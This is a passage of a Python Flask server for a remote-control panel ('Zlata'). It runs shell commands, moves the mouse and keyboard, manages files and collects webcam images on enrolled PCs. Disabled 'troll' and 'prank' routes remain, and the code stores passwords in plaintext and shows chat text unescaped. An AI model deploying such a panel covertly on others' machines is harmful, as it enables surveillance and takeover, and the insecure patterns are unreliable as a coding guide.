<script>async function applyTheme(t){const r=await fetch('{{url_for('set_theme')}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({theme:t})});if(r.ok)location.reload()}</script>
"""

VIEW_TEMPLATE = BASE_STYLE + r"""
<!doctype html><html><head><meta charset="utf-8"><title>{{filename}}</title></head><body><div style="padding:14px"><a href="javascript:history.back()">← Back</a><h3>{{filename}}</h3><pre style="white-space:pre-wrap;background:#020617;color:var(--neon);padding:14px;border:1px solid var(--border);border-radius:8px">{{content}}</pre></div></body></html>
"""


# ---------------------------------------------------------------------------
# UI ROUTES
# ---------------------------------------------------------------------------
@app.get("/")
@login_required
def index():
    cid, selected = selected_client()
    neon, muted = theme_colors()
    with clients_lock:
        pcs = []
        for pcid, c in clients.items():
            pcs.append({
                "id": pcid,
                "name": c.get("name", "Unknown PC"),
                "ip": c.get("ip", "?"),
                "online": client_online(c),
                "caps": sorted(c.get("caps", [])),
                "last_seen": now_ts() if client_online(c) else dt.datetime.fromtimestamp(float(c.get("last_seen", 0))).strftime("%Y-%m-%d %H:%M:%S") if c.get("last_seen") else "never",
            })
    pcs.sort(key=lambda x: (not x["online"], x["name"].lower()))
    return render_template_string(
        MAIN_TEMPLATE,
        neon=neon, muted=muted, themes_list=sorted(THEMES),
        username=session.get("username"), admin_username=ADMIN_USERNAME,
        selected=selected, selected_cid=cid, pc_list=pcs,
        cmd_output=session.pop("last_cmd_output", None),
    )


@app.get("/remote")
@login_required
def remote_page():
    if not has_perm("remote"):
        return jsonify(ok=False, error="No access to remote"), 403
    try:
        cid, c = require_selected()
    except RuntimeError as exc:
        return jsonify(ok=False, error=str(exc)), 409
    neon, muted = theme_colors()
    return render_template_string(REMOTE_TEMPLATE, neon=neon, muted=muted, themes_list=sorted(THEMES), username=session.get("username"), admin_username=ADMIN_USERNAME, cid=cid, pc_name=c.get("name", "Unknown PC"), selected_cid=cid)


@app.get("/fullscreen")
@login_required
def fullscreen_page():
    if not has_perm("screen"):
        return jsonify(ok=False, error="No access to screen"), 403
    try:
        cid, c = require_selected()
    except RuntimeError as exc:
        return jsonify(ok=False, error=str(exc)), 409
    return render_template_string(FULLSCREEN_TEMPLATE, cid=cid, pc_name=c.get("name", "Unknown PC"), neon=theme_colors()[0], muted=theme_colors()[1])


@app.post("/api/fullscreen/click")
@login_required
def fullscreen_click():
    data = request.get_json(silent=True) or {}
    click_type = str(data.get("type", "click"))
    if click_type not in {"click", "double", "right"}:
        return jsonify(ok=False, error="invalid click type"), 400
    return queued_job_response("remote", "input_click", x=data.get("x"), y=data.get("y"), type=click_type)


@app.get("/camera")
@login_required
def camera_page():
    if not has_perm("camera"):
        return jsonify(ok=False, error="No access to camera"), 403
    try:
        cid, c = require_selected()
    except RuntimeError as exc:
        return jsonify(ok=False, error=str(exc)), 409
    neon, muted = theme_colors()
    return render_template_string(CAMERA_TEMPLATE, neon=neon, muted=muted, themes_list=sorted(THEMES), username=session.get("username"), admin_username=ADMIN_USERNAME, cid=cid, pc_name=c.get("name", "Unknown PC"))


@app.get("/files")
@login_required
def files_page():
    if not has_perm("files"):
        return jsonify(ok=False, error="No access to files"), 403
    try:
        cid, c = require_selected()
    except RuntimeError as exc:
        return jsonify(ok=False, error=str(exc)), 409
    path = request.args.get("path", "")
    neon, muted = theme_colors()
    return render_template_string(FILES_TEMPLATE, neon=neon, muted=muted, themes_list=sorted(THEMES), username=session.get("username"), admin_username=ADMIN_USERNAME, cid=cid, pc_name=c.get("name", "Unknown PC"), selected_path=path)


@app.get("/notifications")
@login_required
def notifications_page():
    username = session.get("username")
    data = load_json(NOTIFS_FILE, {})
    items = [f"<b>{n.get('ts','')}</b> · {n.get('title','')}<div class='small'>{n.get('message','')}</div>" for n in data.get(username, [])]
    neon, muted = theme_colors()
    return render_template_string(GENERIC_TEMPLATE, title="🔔 Notifications", items=items, neon=neon, muted=muted, themes_list=sorted(THEMES), username=username, admin_username=ADMIN_USERNAME, selected_cid=selected_client()[0])


@app.route("/messages", methods=["GET", "POST"])
@login_required
def messages_page():
    username = session.get("username")
    users = load_users()
    data = message_items()
    if request.method == "POST":
        to_user = request.form.get("to", "").strip()
        msg = request.form.get("msg", "").strip()
        if to_user in users and msg:
            add_message(to_user, username, msg)
            add_notification(to_user, "New message", f"From {username}: {msg}")
        return redirect(url_for("messages_page"))
    items = [f"<b>{m.get('ts','')}</b> · {m.get('from','')}<div style='margin-top:5px'>{m.get('msg','')}</div>" for m in data.get(username, [])]
    neon, muted = theme_colors()
    form = "<form method='post'><select name='to'>" + "".join(f"<option>{u}</option>" for u in sorted(users)) + "</select><textarea name='msg' placeholder='Message'></textarea><button class='btn'>Send</button></form>"
    return render_template_string(GENERIC_TEMPLATE, title="✉ Messages", items=[form] + items, neon=neon, muted=muted, themes_list=sorted(THEMES), username=username, admin_username=ADMIN_USERNAME, selected_cid=selected_client()[0])


@app.route("/chat", methods=["GET", "POST"])
@login_required
def chat_page():
    username = session.get("username")
    if request.method == "POST":
        add_chat(username, request.form.get("msg", ""))
        return redirect(url_for("chat_page"))
    items = [f"<b>{m.get('user','')}</b> <span class='small'>{m.get('ts','')}</span><div>{m.get('msg','')}</div>" for m in chat_items()]
    neon, muted = theme_colors()
    form = "<form method='post'><textarea name='msg' placeholder='Message'></textarea><button class='btn'>Send</button></form>"
    return render_template_string(GENERIC_TEMPLATE, title="💬 Chat", items=[form] + items, neon=neon, muted=muted, themes_list=sorted(THEMES), username=username, admin_username=ADMIN_USERNAME, selected_cid=selected_client()[0])


@app.get("/admin/users")
@login_required
def admin_users():
    if not is_admin():
        return jsonify(ok=False, error="Admin only"), 403
    users = load_users()
    rows = []
    for u, v in users.items():
        rows.append(f"<div class='client'><b>{u}</b><div class='small'>perms: {', '.join(v.get('permissions', []))}</div></div>")
    form = r"""
<form method="post" action="/admin/users"><input name="username" placeholder="Username"><input name="password" placeholder="Password"><input name="permissions" placeholder="screen,files,camera,remote,commands,chat"><div class="row"><button class="btn" name="action" value="create">Create</button></div></form>
<hr>
<form method="post" action="/admin/users"><input name="username_update" placeholder="Existing username"><input name="password_update" placeholder="New password"><input name="permissions_update" placeholder="screen,files,camera,remote,commands,chat"><button class="btn" name="action" value="update">Update</button></form>
<hr>
<form method="post" action="/admin/users"><input name="username_del" placeholder="Username to delete"><button class="btn danger" name="action" value="delete">Delete</button></form>
"""
    neon, muted = theme_colors()
    return render_template_string(GENERIC_TEMPLATE, title="👥 Users", items=[form] + rows, neon=neon, muted=muted, themes_list=sorted(THEMES), username=session.get("username"), admin_username=ADMIN_USERNAME, selected_cid=selected_client()[0])


@app.post("/admin/users")
@login_required
def admin_users_action():
    if not is_admin():
        return jsonify(ok=False, error="Admin only"), 403
    users = load_users()
    action = request.form.get("action")
    if action == "create":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        perms = [x.strip() for x in request.form.get("permissions", "").split(",") if x.strip()]
        if username and password and username not in users:
            users[username] = {"password": password, "permissions": perms}
            save_json(USERS_FILE, users)
    elif action == "update":
        username = request.form.get("username_update", "").strip()
        if username in users:
            password = request.form.get("password_update", "")
            perms = [x.strip() for x in request.form.get("permissions_update", "").split(",") if x.strip()]
            if password:
                users[username]["password"] = password
            users[username]["permissions"] = perms
            save_json(USERS_FILE, users)
    elif action == "delete":
        username = request.form.get("username_del", "").strip()
        if username and username != ADMIN_USERNAME:
            users.pop(username, None)
            save_json(USERS_FILE, users)
    return redirect(url_for("admin_users"))


@app.get("/camera_gallery")
@login_required
def camera_gallery():
    if not has_perm("camera"):
        return jsonify(ok=False, error="No access to camera"), 403
    items = []
    for p in sorted(CAMERA_DIR.glob("*.jpg"), key=lambda x: x.stat().st_mtime, reverse=True):
        n = p.name.replace("'", "&#039;")
        items.append(f"<div class='client'><b>{n}</b><div class='small'>{dt.datetime.fromtimestamp(p.stat().st_mtime).strftime('%Y-%m-%d %H:%M:%S')}</div><div class='row'><a class='btn' href='{url_for('camera_preview', name=p.name)}'>View</a><a class='btn' href='{url_for('camera_download', name=p.name)}'>Download</a></div></div>")
    neon, muted = theme_colors()
    return render_template_string(GENERIC_TEMPLATE, title="📷 Camera Gallery", items=items, neon=neon, muted=muted, themes_list=sorted(THEMES), username=session.get("username"), admin_username=ADMIN_USERNAME, selected_cid=selected_client()[0])


@app.get("/camera/preview/<name>")
@login_required
def camera_preview(name: str):
    path = CAMERA_DIR / Path(name).name
    if not path.is_file():
        return "not found", 404
    return send_file(path, mimetype="image/jpeg")


@app.get("/camera/download/<name>")
@login_required
def camera_download(name: str):
    path = CAMERA_DIR / Path(name).name
    if not path.is_file():
        return "not found", 404
    return send_file(path, as_attachment=True, download_name=path.name)


# ---------------------------------------------------------------------------
# Synchronous compatibility pages
# ---------------------------------------------------------------------------
@app.get("/files_navigate")
@login_required
def files_navigate():
    return redirect(url_for("files_page", path=request.args.get("path", "")))


@app.get("/files_view")
@login_required
def files_view():
    if not has_perm("files"):
        return jsonify(ok=False, error="No access to files"), 403
    try:
        cid, _ = require_selected()
    except RuntimeError as exc:
        return jsonify(ok=False, error=str(exc)), 409
    result = wait_job(cid, queue_job(cid, "fs_view", path=request.args.get("file", "")))
    if not result.get("ok"):
        return result.get("error", "view failed"), 400
    return render_template_string(VIEW_TEMPLATE, filename=Path(request.args.get("file", "")).name, content=result.get("content", ""), neon=theme_colors()[0], muted=theme_colors()[1])


@app.get("/files_download")
@login_required
def files_download():
    if not has_perm("files"):
        return jsonify(ok=False, error="No access to files"), 403
    try:
        cid, _ = require_selected()
    except RuntimeError as exc:
        return jsonify(ok=False, error=str(exc)), 409
    result = wait_job(cid, queue_job(cid, "fs_download", path=request.args.get("file", "")))
    if not result.get("ok"):
        return result.get("error", "download failed"), 400
    try:
        raw = base64.b64decode(result.get("data_b64", ""), validate=True)
    except Exception:
        return "invalid file payload", 500
    return send_file(io.BytesIO(raw), mimetype="application/octet-stream", as_attachment=True, download_name=result.get("name") or "download.bin")


@app.post("/files_delete")
@login_required
def files_delete():
    if not has_perm("files"):
        return jsonify(ok=False, error="No access to files"), 403
    path = str(request.form.get("file", ""))
    try:
        cid, _ = require_selected()
    except RuntimeError as exc:
        return jsonify(ok=False, error=str(exc)), 409
    result = wait_job(cid, queue_job(cid, "fs_delete", path=path))
    parent = str(Path(path).parent.as_posix()) if path else ""
    if parent == ".":
        parent = ""
    if not result.get("ok"):
        return result.get("error", "delete failed"), 400
    return redirect(url_for("files_page", path=parent))


@app.post("/files_upload")
@login_required
def files_upload():
    if not has_perm("files"):
        return jsonify(ok=False, error="No access to files"), 403
    upload = request.files.get("file")
    if not upload or not upload.filename:
        return "file missing", 400
    raw = upload.read()
    if len(raw) > 8 * 1024 * 1024:
        return "file too large", 413
    try:
        cid, _ = require_selected()
    except RuntimeError as exc:
        return jsonify(ok=False, error=str(exc)), 409
    result = wait_job(cid, queue_job(cid, "fs_upload", path=request.form.get("path", ""), name=Path(upload.filename).name, data_b64=base64.b64encode(raw).decode("ascii")))
    if not result.get("ok"):
        return result.get("error", "upload failed"), 400
    return redirect(url_for("files_page", path=request.form.get("path", "")))


@app.post("/remote/key")
@login_required
def remote_key_alias():
    data = request.get_json(silent=True) or {}
    return api_input_key_impl(data)


def api_input_key_impl(data: dict[str, Any]):
    if not has_perm("remote"):
        return jsonify(ok=False, error="No access to remote"), 403
    key = str(data.get("key", "")).strip()
    mods = data.get("modifiers") or []
    return jsonify(queue_selected("input_key", key=key, modifiers=[str(x) for x in mods]))


@app.post("/remote/type")
@login_required
def remote_type_alias():
    data = request.get_json(silent=True) or {}
    if not has_perm("remote"):
        return jsonify(ok=False, error="No access to remote"), 403
    return jsonify(queue_selected("input_type", text=str(data.get("text", ""))[:4000]))


@app.post("/remote/click")
@login_required
def remote_click_alias():
    data = request.get_json(silent=True) or {}
    if not has_perm("remote"):
        return jsonify(ok=False, error="No access to remote"), 403
    return jsonify(queue_selected("input_click", x=data.get("x"), y=data.get("y"), type=data.get("type", "click")))


@app.post("/run_cmd")
@login_required
def run_cmd_alias():
    if not has_perm("commands"):
        return jsonify(ok=False, error="No access to commands"), 403
    command = str(request.form.get("cmd", "")).strip()
    if not command:
        return redirect(url_for("index"))
    try:
        cid, _ = require_selected()
    except RuntimeError as exc:
        session["last_cmd_output"] = str(exc)
        return redirect(url_for("index"))
    result = wait_job(cid, queue_job(cid, "command", command=command), timeout=35)
    session["last_cmd_output"] = result.get("output") or result.get("error") or "—"
    add_notification(ADMIN_USERNAME, "Command executed", f"{session.get('username')} executed a command on {cid}")
    return redirect(url_for("index"))


@app.post("/sys_action")
@login_required
def sys_action():
    # z15 used this route for local Windows controls. We deliberately keep the
    # route so old forms do not 404, but do not perform host-level shutdowns.
    action = request.form.get("action", "")
    if action == "logout":
        return redirect(url_for("logout"))
    return redirect(url_for("index"))


@app.get("/api/system")
@login_required
def api_system():
    _, c = selected_client()
    return jsonify(cpu=float(c.get("cpu") or 0) if c else 0, ram=float(c.get("ram") or 0) if c else 0)


@app.get("/api/volume")
@login_required
def api_volume():
    return jsonify(ok=False, error="volume job not supported by z16 client"), 409


@app.post("/api/troll/toggle")
@login_required
def api_troll_toggle():
    return jsonify(ok=False, error="Only safe demo effects are enabled"), 409


@app.post("/api/troll/stop")
@login_required
def api_troll_stop():
    return jsonify(ok=True)


@app.get("/prank/disco")
@login_required
def prank_disco():
    return jsonify(ok=False, error="Only safe demo effects are enabled"), 409


@app.get("/processes")
@login_required
def processes_page():
    neon, muted = theme_colors()
    return render_template_string(GENERIC_TEMPLATE, title="⚙ Processes", items=["Process control is not part of the z16 protocol."], neon=neon, muted=muted, themes_list=sorted(THEMES), username=session.get("username"), admin_username=ADMIN_USERNAME, selected_cid=selected_client()[0])


# ---------------------------------------------------------------------------
# ERROR HANDLERS: never leave a mysterious 500 page
# ---------------------------------------------------------------------------
@app.errorhandler(404)
def not_found(_):
    if request.path.startswith("/api/"):
        return jsonify(ok=False, error="Not found", path=request.path), 404
    return "Not found", 404


@app.errorhandler(413)
def too_large(_):
    return jsonify(ok=False, error="Payload too large"), 413


@app.errorhandler(500)
def internal_error(err):
    # Keep browser-facing output readable. Flask still logs the traceback.
    return jsonify(ok=False, error="Internal server error", detail=str(err)), 500


if __name__ == "__main__":
    print("=== Zlata z15 Stable Server ===")
    print(f"Listen: http://{HOST}:{PORT}")
    print(f"Admin: {ADMIN_USERNAME}")
    print(f"Client token configured: {CLIENT_TOKEN != 'change-me-client-token'}")
    if ADMIN_PASSWORD == "change-me":
        print("[WARN] Set REMOTE_PASS before exposing the server.")
    if CLIENT_TOKEN == "change-me-client-token":
        print("[WARN] Set REMOTE_CLIENT_TOKEN to the same value in Zlata and z16.")
    app.run(host=HOST, port=PORT, threaded=True)
